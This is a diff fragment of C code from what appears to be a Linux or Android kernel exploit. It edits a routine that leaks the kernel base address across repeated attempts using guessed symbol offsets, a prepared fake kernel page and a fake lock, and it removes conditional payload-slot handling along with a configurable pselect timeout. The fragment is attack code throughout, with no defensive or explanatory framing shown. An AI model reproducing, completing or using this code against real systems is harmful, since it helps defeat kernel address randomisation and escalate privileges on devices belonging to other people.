@@ -216,13 +216,8 @@ void slide_pselect_stack_copy(void) {
   atomic_store(&slide_consume_last_sched_errno, 0);
 
   struct timespec timeout = {
-#ifdef SLIDE_PSELECT_TIMEOUT_NSEC
-    .tv_sec = 0,
-    .tv_nsec = SLIDE_PSELECT_TIMEOUT_NSEC,
-#else
     .tv_sec = PSELECT_TIMEOUT_SEC,
     .tv_nsec = 0,
-#endif
   };
   struct timespec *timeoutp = &timeout;
 
@@ -538,13 +533,6 @@ int slide_leak_kernel_base(void) {
   }
 
   int max_attempts = forced ? 1 : SLIDE_MAX_ATTEMPTS;
-#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
-    defined(SLIDE_P0_OFFSET_CANDIDATES)
-  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
-  if (!page_base) {
-    return 0;
-  }
-#endif
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     if (forced) {
       slide_p0_offset = forced_offset;
@@ -562,19 +550,10 @@ int slide_leak_kernel_base(void) {
             attempt, max_attempts, slide_p0_offset,
             (unsigned long long)(SLIDE_LOGGERS_0_1 + slide_p0_offset),
             (unsigned long long)(SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset));
-#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
-    defined(SLIDE_P0_OFFSET_CANDIDATES)
-    if (!select_slide_payload_slot(slide_p0_offset)) {
-      pr_error("slide payload slot missing p0_offset=%08zx\n",
-               slide_p0_offset);
-      return 0;
-    }
-#else
     page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
     if (!page_base || !fake_lock) {
       continue;
     }
-#endif
 
     int raw_fds[2];
     SYSCHK(pipe(raw_fds));
